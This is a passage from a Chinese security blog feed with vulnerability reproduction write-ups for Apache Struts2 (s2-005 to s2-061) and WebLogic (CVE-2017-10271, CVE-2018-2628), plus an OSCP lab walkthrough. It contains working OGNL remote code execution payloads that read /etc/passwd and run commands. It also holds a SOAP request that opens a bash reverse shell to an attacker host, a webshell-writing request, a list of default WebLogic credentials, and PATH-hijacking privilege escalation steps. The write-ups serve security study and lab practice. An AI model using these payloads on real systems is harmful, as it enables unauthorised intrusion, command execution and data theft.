class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>s2-005漏洞的起源源于S2-003(受影响版本: 低于Struts  2.0.12)，struts2会将http的每个<strong>参数名</strong>解析为OGNL语句执行(可理解为java代码)。OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码(\u0023)或8进制(\43)即绕过了安全限制，对于S2-003漏洞，官方通过增加安全配置(禁止静态方法调用和类方法执行等)来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这2个选项打开</p><h3 id="2、影响版本-1"><a href="#2、影响版本-1" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0-2.1.8.1</p><h3 id="3、漏洞复现-1"><a href="#3、漏洞复现-1" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>在URL 上添加GET请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/1.txt%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519153246335.png" alt="image-20240519153246335"></p><h2 id="四、s2-007-漏洞复现"><a href="#四、s2-007-漏洞复现" class="headerlink" title="四、s2-007 漏洞复现"></a>四、s2-007 漏洞复现</h2><h3 id="1、漏洞原理-2"><a href="#1、漏洞原理-2" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>在用户登陆中，age 字段用户可控，传递一个非整数的值 会导致错误，而输入的非整数的值会被当作 ONGL 表达式执行，造成代码执行漏洞</p><h3 id="2、影响版本-2"><a href="#2、影响版本-2" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.2.3</p><h3 id="3、漏洞复现-2"><a href="#3、漏洞复现-2" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%20/%27%29.getInputStream%28%29%29%29+%2B+%27</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155052688.png" alt="image-20240519155052688"></p><p><img src="/img/VulnRep-Struts2/image-20240519155138909.png" alt="image-20240519155138909"></p><h2 id="五、s2-008-漏洞复现"><a href="#五、s2-008-漏洞复现" class="headerlink" title="五、s2-008 漏洞复现"></a>五、s2-008 漏洞复现</h2><h3 id="1、漏洞原理-3"><a href="#1、漏洞原理-3" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对  Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode  模式后会有多个调试接口能够直接查看对象信息或直接执行命令，但是这种情况在生产环境中几乎不可能存在，所以还是很鸡肋。</p><h3 id="2、影响版本-3"><a href="#2、影响版本-3" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.1.0 – 2.3.1</p><h3 id="3、漏洞复现-3"><a href="#3、漏洞复现-3" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p><img src="/img/VulnRep-Struts2/image-20240519155541080.png" alt="image-20240519155541080"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&amp;rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=123456789&amp;command=id</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240519155800147.png" alt="image-20240519155800147"></p><p><img src="/img/VulnRep-Struts2/image-20240519155826251.png" alt="image-20240519155826251"></p><h2 id="六、s2-009-漏洞复现"><a href="#六、s2-009-漏洞复现" class="headerlink" title="六、s2-009 漏洞复现"></a>六、s2-009 漏洞复现</h2><h3 id="1、漏洞原理-4"><a href="#1、漏洞原理-4" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h3><p>OGNL提供了广泛的表达式评估功能，可以将任何暴露的字符串变量中的恶意表达式注入该功能。其中 ParametersInterceptor 中的正则表达式将<code>top[&#39;foo&#39;](0)</code>作为有效的表达式进行匹配，而OGNL 正好将该参数的值作为OGNL的表达式进行求值达成RCE。由于OGNL 语句在HTTP参数中，攻击者可以使用黑名单字符（例如 # ）禁用方法执行并执行任意方法，绕过ParametersInterceptor 和OGNL 库的保护。</p><h3 id="2、影响版本-4"><a href="#2、影响版本-4" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.1.0 - 2.3.1.1</p><h3 id="3、漏洞复现-4"><a href="#3、漏洞复现-4" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Struts2/image-20240521151249574.png" alt="image-20240521151249574"></p><p>2、漏洞存在的功能点</p><p><img src="/img/VulnRep-Struts2/image-20240521151422926.png" alt="image-20240521151422926"></p><p>3、构造POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xxx/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%22cat%20/etc/passwd%22).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Struts2/image-20240521152029957.png" alt="image-20240521152029957"></p><h2 id="七、s2-061-漏洞复现（CVE-2020-17530）"><a href="#七、s2-061-漏洞复现（CVE-2020-17530）" class="headerlink" title="七、s2-061 漏洞复现（CVE-2020-17530）"></a>七、s2-061 漏洞复现（CVE-2020-17530）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Apache Struts2 框架是一个用于开发Java EE 网络应用程序的Web 框架。该漏洞中，Struts2 会对某些变迁属性（如id等） 的属性值进行二次表达式解析，这些标签使用%{}的形式，当内容的值可控时，如%{payload}，会造成OGNL 表达式代码执行漏洞。</p><h3 id="2、影响版本-5"><a href="#2、影响版本-5" class="headerlink" title="2、影响版本"></a>2、影响版本</h3><p>Struts 2.0.0 - 2.5.25</p><h3 id="3、漏洞复现-5"><a href="#3、漏洞复现-5" class="headerlink" title="3、漏洞复现"></a>3、漏洞复现</h3><p>1、首页</p><p><img src="/img/VulnRep-Struts2/image-20240521153309700.png" alt="image-20240521153309700"></p><p>2、查看是否存在漏洞，id变为49，存在漏洞</p><p><img src="/img/VulnRep-Struts2/image-20240521154118205.png" alt="image-20240521154118205"></p><p>3、加上POC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%25&#123;(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d&#123;%27id%27&#125;).(%23res%3d%23exec.exec(%23cmd))&#125;</span><br></pre></td></tr></table></figure><p>![image-20240521154308136&#x2F;img&#x2F;VulnRep-Struts2&#x2F;-20240521154308136.png)</p>]]></content>
      
      
      <categories>
          
          <category> 复现与审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机-Inclusiveness</title>
      <link href="/2024/05/20/OSCP-Inclusiveness/"/>
      <url>/2024/05/20/OSCP-Inclusiveness/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP系列靶机—Inclusiveness"><a href="#OSCP系列靶机—Inclusiveness" class="headerlink" title="OSCP系列靶机—Inclusiveness"></a>OSCP系列靶机—Inclusiveness</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-Inclusiveness/image-20240520151900221.png" alt="image-20240520151900221"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><h3 id="1、快速扫描"><a href="#1、快速扫描" class="headerlink" title="1、快速扫描"></a>1、快速扫描</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152020037.png" alt="image-20240520152020037"></p><h3 id="2、全端口扫描"><a href="#2、全端口扫描" class="headerlink" title="2、全端口扫描"></a>2、全端口扫描</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520152416619.png" alt="image-20240520152416619"></p><h3 id="3、服务版本扫描"><a href="#3、服务版本扫描" class="headerlink" title="3、服务版本扫描"></a>3、服务版本扫描</h3><p>使用基本的脚本对21，22，80端口进行服务探测和版本扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sT -sV -sC -O -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520152636647.png" alt="image-20240520152636647"></p><p>ftp 存在匿名访问，80采用apache2 的一个http服务，系统使用Debian</p><h3 id="4、nmap-基础漏洞探测"><a href="#4、nmap-基础漏洞探测" class="headerlink" title="4、nmap 基础漏洞探测"></a>4、nmap 基础漏洞探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p21,22,80 192.168.31.50</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520153649501.png" alt="image-20240520153649501"></p><p>未发现什么漏洞，指出80端口可能存在以下csrf 漏洞。</p><h2 id="三、ftp-信息收集"><a href="#三、ftp-信息收集" class="headerlink" title="三、ftp 信息收集"></a>三、ftp 信息收集</h2><p>ftp 的匿名访问查看ftp 服务有啥东西</p><p><img src="/img/OSCP-Inclusiveness/image-20240520153537590.png" alt="image-20240520153537590"></p><p>啥也没有，但可以上传文件</p><p><img src="/img/OSCP-Inclusiveness/image-20240520161820172.png" alt="image-20240520161820172"></p><h2 id="四、http-服务信息收集"><a href="#四、http-服务信息收集" class="headerlink" title="四、http 服务信息收集"></a>四、http 服务信息收集</h2><h3 id="1、目录扫描"><a href="#1、目录扫描" class="headerlink" title="1、目录扫描"></a>1、目录扫描</h3><p>过滤404、403</p><p><img src="/img/OSCP-Inclusiveness/image-20240520154229845.png" alt="image-20240520154229845"></p><h3 id="2、robots-txt-搜索引擎"><a href="#2、robots-txt-搜索引擎" class="headerlink" title="2、robots.txt 搜索引擎"></a>2、robots.txt 搜索引擎</h3><p><img src="/img/OSCP-Inclusiveness/image-20240520154813062.png" alt="image-20240520154813062"></p><p>这些robots.txt 文件都在输出同样的语句，禁止我们的搜索引擎去访问robots.txt 文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are not a search engine! You can&#x27;t read my robots.txt! </span><br></pre></td></tr></table></figure><p>找到了这篇文章：<a href="https://blog.csdn.net/sh2018/article/details/121042435">详细robots.txt写法大全和禁止目录收录及指定页面</a></p><p>其中提到了两个UA头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Baiduspider</span><br><span class="line">Googlebot</span><br></pre></td></tr></table></figure><p>抓包修改UA头，得到<code>/secret_information/</code>的路径</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163123785.png" alt="image-20240520163123785"></p><p>访问</p><p><img src="/img/OSCP-Inclusiveness/image-20240520163208210.png" alt="image-20240520163208210"></p><h3 id="3、文件包含结合ftp-上传getshell"><a href="#3、文件包含结合ftp-上传getshell" class="headerlink" title="3、文件包含结合ftp 上传getshell"></a>3、文件包含结合ftp 上传getshell</h3><p>这里提到的是 DNS 区域传输攻击，不过这里考察的并不是该攻击，而是通过切换语言造成的文件包含漏洞</p><p><img src="/img/OSCP-Inclusiveness/image-20240520164607428.png" alt="image-20240520164607428"></p><p>ftp 的默认工作路径在<code>/var/ftp</code>，联合ftp 上传webshell进行包含</p><p><img src="/img/OSCP-Inclusiveness/image-20240520165148245.png" alt="image-20240520165148245"></p><p><img src="/img/OSCP-Inclusiveness/image-20240520165826526.png" alt="image-20240520165826526"></p><p>之后将webshell反弹到msf，这里就不演示了</p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权到tom"><a href="#1、提权到tom" class="headerlink" title="1、提权到tom"></a>1、提权到tom</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520170743996.png" alt="image-20240520170743996"></p><p><code>/home/tom/rootshell</code>文件相当可疑啊</p><p><img src="/img/OSCP-Inclusiveness/image-20240520170919194.png" alt="image-20240520170919194"></p><p>还有一个<code>rootshell.c</code>文件，疑似源代码文件</p><p><img src="/img/OSCP-Inclusiveness/image-20240520172008695.png" alt="image-20240520172008695"></p><p>这段代码大致的意思是如果whoami是tom ，则输出<code>access ...</code>并重新进入一个sh。</p><p>采用环境变量，伪造一个whoami 的可执行文件，劫持真正的whoami命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp ; echo &#x27;echo tom&#x27; &gt; whoami ; chmod +x whoami</span><br><span class="line"></span><br><span class="line">which whoami</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-Inclusiveness/image-20240520173328198.png" alt="image-20240520173328198"></p><p>再次执行<code>rootshell</code> 文件，提权到tom</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173435588.png" alt="image-20240520173435588"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>通过<code>sudo -l</code>发现全命令可用，直接<code>sudo su</code>提权到root</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173609057.png" alt="image-20240520173609057"></p><p>获取flag</p><p><img src="/img/OSCP-Inclusiveness/image-20240520173705535.png" alt="image-20240520173705535"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】WebLogic 系列漏洞复现</title>
      <link href="/2024/05/18/VulnRep-WebLogic/"/>
      <url>/2024/05/18/VulnRep-WebLogic/</url>
      
        <content type="html"><![CDATA[<h1 id="【漏洞复现】WebLogic-系列漏洞复现"><a href="#【漏洞复现】WebLogic-系列漏洞复现" class="headerlink" title="【漏洞复现】WebLogic 系列漏洞复现"></a>【漏洞复现】WebLogic 系列漏洞复现</h1><h2 id="一、WebLogic-概述"><a href="#一、WebLogic-概述" class="headerlink" title="一、WebLogic 概述"></a>一、WebLogic 概述</h2><p>WebLogic是oracle 公司出品的java中间件，可与Oracle 产品和技术相辅相成。</p><p>其默认的开放端口是7001</p><p>默认后台登录地址：<a href="http://xxxx.xxx:7001/console">http://xxxx.xxx:7001/console</a></p><p>一些常见的弱口令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@123</span><br></pre></td></tr></table></figure><h2 id="二、XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#二、XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="二、XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>二、XMLDecoder反序列化漏洞（CVE-2017-10271）</h2><h3 id="1、漏洞原因"><a href="#1、漏洞原因" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>Weblogic的WLS Security 组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，由于XMLDecoder处理不当，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="2、漏洞影响"><a href="#2、漏洞影响" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>攻击者可以利用这个漏洞发送精心构造的XML数据，通过反序列化执行任意命令，甚至可以通过反弹shell拿到权限。</p><h3 id="3、漏洞涉及版本"><a href="#3、漏洞涉及版本" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><p>受影响的版本包括但不限于：</p><ol><li>OracleWebLogic Server 10.3.6.0.0</li><li>OracleWebLogic Server 12.1.3.0.0</li><li>OracleWebLogic Server 12.2.1.1.0</li><li>OracleWebLogic Server 12.2.1.2.0</li></ol><h3 id="4、漏洞复现"><a href="#4、漏洞复现" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>首页如图，漏洞不在首页</p><p><img src="/img/VulnRep-WebLogic/image-20240516155424032.png" alt="image-20240516155424032"></p><p>我们需要POST提交到<code>/wls-wsat/CoordinatorPortType</code>，并配合XMLDecoder 解析xml 数据，在解析过程中存在反序列化漏洞，造成命令执行。</p><p>命令反弹整体报文如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.31.51:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/攻击机的IP/监听的端口 0&amp;gt;&amp;amp;1&lt;/string&gt; </span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>由于我此时环境准备不够充分，在此只展示webshell 写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 81.70.248.223:7002</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 1164</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">     &lt;soapenv:Header&gt;</span><br><span class="line">     &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">     &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">     &lt;object class=&quot;java.io.PrintWriter&quot;&gt;      &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test4.jsp&lt;/string&gt;</span><br><span class="line">     &lt;void method=&quot;println&quot;&gt;&lt;string&gt;</span><br><span class="line">     &lt;![CDATA[</span><br><span class="line"> /*冰蝎马的文件内容*/</span><br><span class="line">     ]]&gt;</span><br><span class="line">     &lt;/string&gt;</span><br><span class="line">     &lt;/void&gt;</span><br><span class="line">     &lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">     &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;</span><br><span class="line">     &lt;/work:WorkContext&gt;</span><br><span class="line">     &lt;/soapenv:Header&gt;</span><br><span class="line">     &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>文件写入在<code>/bea_wls_internal/test4.jsp</code>中，用冰蝎进行连接</p><p><img src="/img/VulnRep-WebLogic/image-20240516162202590.png" alt="image-20240516162202590"></p><h3 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><p>方法一：删除wls-wsat组件，然后重启weblogic</p><p>方法二：官网下载，打补丁</p><h2 id="三、WebLogic反序列化漏洞（CVE-2018-2628）"><a href="#三、WebLogic反序列化漏洞（CVE-2018-2628）" class="headerlink" title="三、WebLogic反序列化漏洞（CVE-2018-2628）"></a>三、WebLogic反序列化漏洞（CVE-2018-2628）</h2><h3 id="1、漏洞原因-1"><a href="#1、漏洞原因-1" class="headerlink" title="1、漏洞原因"></a>1、漏洞原因</h3><p>WebLogic 的T3协议是WebLogic 与Java 之间进行通讯的一个基于Java RMI远程方法调用的一个协议，攻击者可以通过T3协议发送恶意的的反序列化数据，进行反序列化，实现对存在漏洞的weblogic组件的远程代码执行攻击。</p><h3 id="2、漏洞影响-1"><a href="#2、漏洞影响-1" class="headerlink" title="2、漏洞影响"></a>2、漏洞影响</h3><p>T3协议在开放WebLogic控制台端口的应用上默认开启，攻击者可以通过T3协议发送恶意的的反序列化数据，利用RMI（远程方法调用）机制的缺陷，通过JRMP协议（java 远程消息交换协议）导致未授权用户在远程服务器执行任意命令。</p><h3 id="3、漏洞涉及版本-1"><a href="#3、漏洞涉及版本-1" class="headerlink" title="3、漏洞涉及版本"></a>3、漏洞涉及版本</h3><ol><li>Oracle WebLogic Server 10.3.6.0</li><li>Oracle WebLogic Server 12.1.3.0</li><li>Oracle WebLogic Server 12.2.1.2</li><li>Oracle WebLogic Server 12.2.1.3</li></ol><h3 id="4、漏洞复现-1"><a href="#4、漏洞复现-1" class="headerlink" title="4、漏洞复现"></a>4、漏洞复现</h3><p>可先通过nmap脚本<code>–script=weblogic-t3-info</code> 查看weblogic版本信息和t3协议是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -A -T4 -p 7001 IP</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-WebLogic/image-20240516171815911.png" alt="image-20240516171815911"></p><p>看到T3协议在使用，并且WebLogic 的版本信息为：10.3.6.0</p><p>查看<code>console</code> 路径</p><p><img src="/img/VulnRep-WebLogic/image-20240516172014110.png" alt="image-20240516172014110"></p><p>这里使用：<a href="https://github.com/Lighird/CVE-2018-2628">CVE-2018-2628漏洞工具包</a></p><p>1、利用 <code>ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</code>启动一个JRMP Server</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8080 CommonsCollections1 &#x27;touch /tmp/test.txt&#x27;</span><br><span class="line">&#x27;touch /tmp/test.txt&#x27;为我想执行的命令，8080是JRMP Server监听的端口。</span><br></pre></td></tr></table></figure><p>2、下载对应的exp：<a href="https://www.exploit-db.com/exploits/44553">https://www.exploit-db.com/exploits/44553</a></p><p><img src="/img/VulnRep-WebLogic/image-20240516175658008.png" alt="image-20240516175658008"></p><p>3、修改名称并启动exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mv 44553 44553.py</span><br><span class="line"></span><br><span class="line">python 44553.py 172.24.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.100.34 8080 JRMPClient</span><br></pre></td></tr></table></figure><p>4、进入docker容器可以看到存在<code>test.txt</code>文件</p><p><img src="/img/VulnRep-WebLogic/image-20240516180201425.png" alt="image-20240516180201425"></p><h3 id="5、漏洞修复-1"><a href="#5、漏洞修复-1" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h3><ol><li>关闭T3服务，或控制T3服务的访问权限(临时)。</li><li>打官方补丁。</li></ol><h2 id="四、任意文件上传漏洞（CVE-2018-2894）"><a href="#四、任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="四、任意文件上传漏洞（CVE-2018-2894）"></a>四、任意文件上传漏洞（CVE-2018-2894）</h2><h3 id="1、漏洞原因-2"><a href="#1、漏洞原因-2" class="headerlink" 